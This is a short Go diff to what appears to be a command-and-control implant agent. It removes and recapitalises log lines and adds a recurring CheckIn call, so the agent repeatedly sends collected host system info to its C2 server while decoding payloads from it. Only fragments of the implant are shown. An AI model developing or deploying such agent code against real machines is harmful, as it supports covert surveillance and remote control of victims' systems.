@@ -29,7 +29,6 @@ import (
 // CheckIn poll CC server and report its system info
 func CheckIn() error {
 	info := CollectSystemInfo()
-	log.Println("Collected system info, now checking in...")
 
 	sysinfoJSON, err := json.Marshal(info)
 	if err != nil {
@@ -135,12 +134,12 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 	// check for CC server's response
 	go func() {
-		log.Println("check CC response: started")
+		log.Println("Check CC response: started")
 		for ctx.Err() == nil {
 			// read response
 			err = in.Decode(&msg)
 			if err != nil {
-				log.Print("check CC response: JSON msg decode: ", err)
+				log.Print("Check CC response: JSON msg decode: ", err)
 				break
 			}
 			payload := msg.Payload
@@ -179,6 +178,10 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		if !sendHello(util.RandInt(1, 10)) {
 			log.Print("sendHello failed")
 			break
+		}
+		err = CheckIn()
+		if err != nil {
+			log.Printf("Updating agent sysinfo: %v", err)
 		}
 	}
 
